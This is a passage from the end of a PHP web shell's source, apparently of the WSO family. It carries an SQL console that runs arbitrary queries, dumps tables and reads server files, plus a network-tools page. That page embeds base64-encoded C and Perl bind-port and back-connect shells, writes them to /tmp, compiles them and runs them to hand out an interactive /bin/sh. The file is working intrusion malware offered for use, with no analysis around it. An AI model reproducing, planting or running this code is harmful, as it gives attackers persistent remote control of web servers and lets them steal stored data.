				echo '<option value="'.$value.'" '.($value==$_POST['sql_base']?'selected':'').'>'.$value.'</option>';
			}
			echo '</select></label>';
		}
		else echo $tmp;
	}else
		echo $tmp;
	echo "</td>
				<td><input type=submit value='submit' onclick='fs(d.sf);'></td>
                <td><input type=checkbox name=sql_count value='on'" . (empty($_POST['sql_count'])?'':' checked') . "> count the number of rows</td>
			</tr>
		</table>
		<script>
            s_db='".@addslashes($_POST['sql_base'])."';
            function fs(f) {
                if(f.sql_base.value!=s_db) { f.onsubmit = function() {};
                    if(f.p1) f.p1.value='';
                    if(f.p2) f.p2.value='';
                    if(f.p3) f.p3.value='';
                }
            }
			function st(t,l) {
				d.sf.p1.value = 'select';
				d.sf.p2.value = t;
                if(l && d.sf.p3) d.sf.p3.value = l;
				d.sf.submit();
			}
			function is() {
				for(i=0;i<d.sf.elements['tbl[]'].length;++i)
					d.sf.elements['tbl[]'][i].checked = !d.sf.elements['tbl[]'][i].checked;
			}
		</script>";
	if(isset($db) && $db->link){
		echo "<br/><table width=100% cellpadding=2 cellspacing=0>";
			if(!empty($_POST['sql_base'])){
				$db->selectdb($_POST['sql_base']);
				echo "<tr><td width=1 style='border-top:2px solid #666;'><span>Tables:</span><br><br>";
				$tbls_res = $db->listTables();
				while($▟ = $db->fetch($tbls_res)) {
					list($key, $value) = each($▟);
                    if(!empty($_POST['sql_count']))
                        $n = $db->fetch($db->query('SELECT COUNT(*) as n FROM '.$value.''));
					$value = htmlspecialchars($value);
					echo "<nobr><input type='checkbox' name='tbl[]' value='".$value."'>&nbsp;<a href=# onclick=\"st('".$value."',1)\">".$value."</a>" . (empty($_POST['sql_count'])?'&nbsp;':" <small>({$n['n']})</small>") . "</nobr><br>";
				}
				echo "<input type='checkbox' onclick='is();'> <input type=submit value='Dump' onclick='document.sf.p2.value=\"download\";document.sf.submit();'><br>File path:<input type=text name=file value='dump.sql'></td><td style='border-top:2px solid #666;'>";
				if(@$_POST['p1'] == 'select') {
					$_POST['p1'] = 'query';
                    $_POST['p3'] = $_POST['p3']?$_POST['p3']:1;
					$db->query('SELECT COUNT(*) as n FROM ' . $_POST['p2']);
					$num = $db->fetch();
					$pages = ceil($num['n'] / 30);
                    echo "<script>d.sf.onsubmit=function(){st(\"" . $_POST['p2'] . "\", d.sf.p3.value)}</script><span>".$_POST['p2']."</span> ({$num['n']} records) Page # <input type=text name='p3' value=" . ((int)$_POST['p3']) . ">";
                    echo " of $pages";
                    if($_POST['p3'] > 1)
                        echo " <a href=# onclick='st(\"" . $_POST['p2'] . '", ' . ($_POST['p3']-1) . ")'>&lt; Prev</a>";
                    if($_POST['p3'] < $pages)
                        echo " <a href=# onclick='st(\"" . $_POST['p2'] . '", ' . ($_POST['p3']+1) . ")'>Next &gt;</a>";
                    $_POST['p3']--;
					if($_POST['type']=='pgsql')
						$_POST['p2'] = 'SELECT * FROM '.$_POST['p2'].' LIMIT 30 OFFSET '.($_POST['p3']*30);
					else
						$_POST['p2'] = 'SELECT * FROM `'.$_POST['p2'].'` LIMIT '.($_POST['p3']*30).',30';
					echo "<br><br>";
				}
				if((@$_POST['p1'] == 'query') && !empty($_POST['p2'])) {
					$db->query(@$_POST['p2']);
					if($db->res !== false) {
						$title = false;
						echo '<table width=100% cellspacing=1 cellpadding=2 class=main>';
						$line = 1;
						while($▟ = $db->fetch())	{
							if(!$title)	{
								echo '<tr>';
								foreach($▟ as $key => $value)
									echo '<th>'.$key.'</th>';
								reset($▟);
								$title=true;
								echo '</tr><tr>';
								$line = 2;
							}
							echo '<tr class="l'.$line.'">';
							$line = $line==1?2:1;
							foreach($▟ as $key => $value) {
								if($value == null)
									echo '<td><i>null</i></td>';
								else
									echo '<td>'.nl2br(htmlspecialchars($value)).'</td>';
							}
							echo '</tr>';
						}
						echo '</table>';
					} else {
						echo '<div><b>Error:</b> '.htmlspecialchars($db->error()).'</div>';
					}
				}
				echo "<br></form><form onsubmit='d.sf.p1.value=\"query\";d.sf.p2.value=this.query.value;document.sf.submit();return false;'><textarea name='query' style='width:100%;height:100px'>";
                if(!empty($_POST['p2']) && ($_POST['p1'] != 'loadfile'))
                    echo htmlspecialchars($_POST['p2']);
                echo "</textarea><br/><input type=submit value='Execute'>";
				echo "</td></tr>";
			}
			echo "</table></form><br/>";
            if($_POST['type']=='mysql') {
                $db->query("SELECT 1 FROM mysql.user WHERE concat(`user`, '@', `host`) = USER() AND `File_priv` = 'y'");
                if($db->fetch())
                    echo "<form onsubmit='d.sf.p1.value=\"loadfile\";document.sf.p2.value=this.f.value;document.sf.submit();return false;'><span>Load file</span> <input  class='toolsInp' type=text name=f><input type=submit value='submit'></form>";
            }
			if(@$_POST['p1'] == 'loadfile') {
				$file = $db->loadFile($_POST['p2']);
				echo '<br/><pre class=ml1>'.htmlspecialchars($file['file']).'</pre>';
			}
	} else {
        echo htmlspecialchars($db->error());
    }
	echo '</div>';
	hardFooter();
}
function actionNetwork() {
	hardHeader();
	$back_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pIHsNCiAgICBpbnQgZmQ7DQogICAgc3RydWN0IHNvY2thZGRyX2luIHNpbjsNCiAgICBkYWVtb24oMSwwKTsNCiAgICBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJdKSk7DQogICAgc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsNCiAgICBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsNCiAgICBpZiAoKGNvbm5lY3QoZmQsIChzdHJ1Y3Qgc29ja2FkZHIgKikgJnNpbiwgc2l6ZW9mKHN0cnVjdCBzb2NrYWRkcikpKTwwKSB7DQogICAgICAgIHBlcnJvcigiQ29ubmVjdCBmYWlsIik7DQogICAgICAgIHJldHVybiAwOw0KICAgIH0NCiAgICBkdXAyKGZkLCAwKTsNCiAgICBkdXAyKGZkLCAxKTsNCiAgICBkdXAyKGZkLCAyKTsNCiAgICBzeXN0ZW0oIi9iaW4vc2ggLWkiKTsNCiAgICBjbG9zZShmZCk7DQp9";
	$back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
	$bind_port_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8bmV0ZGIuaD4NCiNpbmNsdWRlIDxzdGRsaWIuaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICoqYXJndikgew0KICAgIGludCBzLGMsaTsNCiAgICBjaGFyIHBbMzBdOw0KICAgIHN0cnVjdCBzb2NrYWRkcl9pbiByOw0KICAgIGRhZW1vbigxLDApOw0KICAgIHMgPSBzb2NrZXQoQUZfSU5FVCxTT0NLX1NUUkVBTSwwKTsNCiAgICBpZighcykgcmV0dXJuIC0xOw0KICAgIHIuc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgci5zaW5fcG9ydCA9IGh0b25zKGF0b2koYXJndlsxXSkpOw0KICAgIHIuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7DQogICAgYmluZChzLCAoc3RydWN0IHNvY2thZGRyICopJnIsIDB4MTApOw0KICAgIGxpc3RlbihzLCA1KTsNCiAgICB3aGlsZSgxKSB7DQogICAgICAgIGM9YWNjZXB0KHMsMCwwKTsNCiAgICAgICAgZHVwMihjLDApOw0KICAgICAgICBkdXAyKGMsMSk7DQogICAgICAgIGR1cDIoYywyKTsNCiAgICAgICAgd3JpdGUoYywiUGFzc3dvcmQ6Iiw5KTsNCiAgICAgICAgcmVhZChjLHAsc2l6ZW9mKHApKTsNCiAgICAgICAgZm9yKGk9MDtpPHN0cmxlbihwKTtpKyspDQogICAgICAgICAgICBpZiggKHBbaV0gPT0gJ1xuJykgfHwgKHBbaV0gPT0gJ1xyJykgKQ0KICAgICAgICAgICAgICAgIHBbaV0gPSAnXDAnOw0KICAgICAgICBpZiAoc3RyY21wKGFyZ3ZbMl0scCkgPT0gMCkNCiAgICAgICAgICAgIHN5c3RlbSgiL2Jpbi9zaCAtaSIpOw0KICAgICAgICBjbG9zZShjKTsNCiAgICB9DQp9";
	$bind_port_p="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
	echo "<h1>Network tools</h1><div class=content>
	<form name='nfp' onSubmit='g(null,null,this.using.value,this.port.value,this.pass.value);return false;'>
	<span>Bind port to /bin/sh</span><br/>
	Port: <input type='text' name='port' value='31337'> Password: <input type='text' name='pass'> Using: <label><select name='using'><option value='bpc'>C</option><option value='bpp'>Perl</option></select></label> <input type=submit value='submit'>
	</form>
	<form name='nfp' onSubmit='g(null,null,this.using.value,this.server.value,this.port.value);return false;'>
	<span>Back-connect to</span><br/>
	Server: <input type='text' name='server' value=". $_SERVER['REMOTE_ADDR'] ."> Port: <input type='text' name='port' value='31337'> Using: <label><select name='using'><option value='bcc'>C</option><option value='bcp'>Perl</option></select></label> <input type=submit value='submit'>
	</form><br>";
	if(isset($_POST['p1'])) {
		function cf($f,$t) {
			$w=@fopen($f,"w") or @function_exists('file_put_contents');
			if($w)	{
				@fwrite($w,@base64_decode($t)) or @fputs($w,@base64_decode($t)) or @file_put_contents($f,@base64_decode($t));
				@fclose($w);
			}
		}
		if($_POST['p1'] == 'bpc') {
			cf("/tmp/bp.c",$bind_port_c);
			$▖ = ex("gcc -o /tmp/bp /tmp/bp.c");
			@unlink("/tmp/bp.c");
			$▖ .= ex("/tmp/bp ".$_POST['p2']." ".$_POST['p3']." &");
			echo "<pre class=ml1>$▖".ex("ps aux | grep bp")."</pre>";
		}
		if($_POST['p1'] == 'bpp') {
			cf("/tmp/bp.pl",$bind_port_p);
			$▖ = ex(which("perl")." /tmp/bp.pl ".$_POST['p2']." &");
			echo "<pre class=ml1>$▖".ex("ps aux | grep bp.pl")."</pre>";
		}
		if($_POST['p1'] == 'bcc') {
			cf("/tmp/bc.c",$back_connect_c);
			$▖ = ex("gcc -o /tmp/bc /tmp/bc.c");
			@unlink("/tmp/bc.c");
			$▖ .= ex("/tmp/bc ".$_POST['p2']." ".$_POST['p3']." &");
			echo "<pre class=ml1>$▖".ex("ps aux | grep bc")."</pre>";
		}
		if($_POST['p1'] == 'bcp') {
			cf("/tmp/bc.pl",$back_connect_p);
			$▖ = ex(which("perl")." /tmp/bc.pl ".$_POST['p2']." ".$_POST['p3']." &");
			echo "<pre class=ml1>$▖".ex("ps aux | grep bc.pl")."</pre>";
		}
	}
	echo '</div>';
	hardFooter();
}
if( empty($_POST['a']) )
	if(isset($▚) && function_exists('action' . $▚))
		$_POST['a'] = $▚;
	else
		$_POST['a'] = 'FilesMan';
if( !empty($_POST['a']) && function_exists('action' . $_POST['a']) )
	call_user_func('action' . $_POST['a']);
?>
